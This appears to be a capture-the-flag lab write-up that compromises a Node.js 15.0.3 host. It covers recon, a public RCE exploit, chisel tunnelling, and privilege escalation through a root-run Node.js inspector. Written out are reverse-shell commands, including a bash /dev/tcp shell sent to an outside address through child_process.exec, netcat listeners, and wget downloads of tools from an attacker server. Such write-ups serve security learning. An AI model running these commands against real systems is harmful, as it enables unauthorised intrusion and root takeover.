Recon

Started with a standard Nmap scan.

bash
nmap -sV -sC 10.10.x.x
22SSH
3000HTTP — Node.js

Port 3000 served a Node.js application. Version fingerprinting revealed Node.js 15.0.3, which has a known RCE vulnerability.

Foothold — Node.js RCE

Found a public PoC exploit for the Node.js version. The payload used a crafted busybox reverse shell.

bash
# On attacker — set up listener
nc -lvnp 4444

# Run the PoC with busybox reverse shell payload
python3 exploit.py --target http://10.10.x.x:3000 --lhost ATTACKER_IP --lport 4444
Shell received

Got a shell back. Upgraded to a full TTY:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg

Transferred and ran linpeas for local enumeration.

bash
# On attacker
python3 -m http.server 8000

# On victim
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Interesting process found

/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js running as root with the Node.js inspector exposed on localhost.

Privilege Escalation: Node.js Inspector via Chisel

The inspector was bound to 127.0.0.1:9229, only accessible locally. No SSH credentials or keys were available to forward the port directly. Used chisel to tunnel it out instead.

What is chisel?

Chisel is a TCP tunnel over HTTP. Running it in server mode on the attacker and client mode on the victim lets you forward ports without SSH, as long as you can transfer a binary.

bash
# Transfer chisel to victim
wget http://ATTACKER_IP:8000/chisel
chmod +x chisel

# On attacker — start chisel server
./chisel server --reverse --port 8001

# On victim — connect and forward port 9229
./chisel client 10.10.15.63:8001 R:9229:localhost:9229
Tunnel established

Port 9229 on the victim is now accessible as localhost:9229 on the attacker.

Opened chrome://inspect in Chromium. The inspector console for the root-owned Node.js process appeared as a remote target. Connected to it and executed a reverse shell from the debug console.

node inspector console
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.15.63/5555 0>&1"')
bash
# On attacker, listener on port 5555
nc -lvnp 5555
Root shell

The process was running as root, so the shell came back with full privileges.

Takeaways

Key lessons
  • Always fingerprint the exact runtime version, Node.js 15.0.3 is specific enough to find a targeted CVE immediately
  • Chisel is invaluable when you need port forwarding but have no SSH access
  • --inspect bound to localhost on a root process is a direct privesc path; chrome://inspect makes it trivial to exploit
  • linpeas highlights running processes and their flags so always read that section carefully, not just the SUID and sudo output
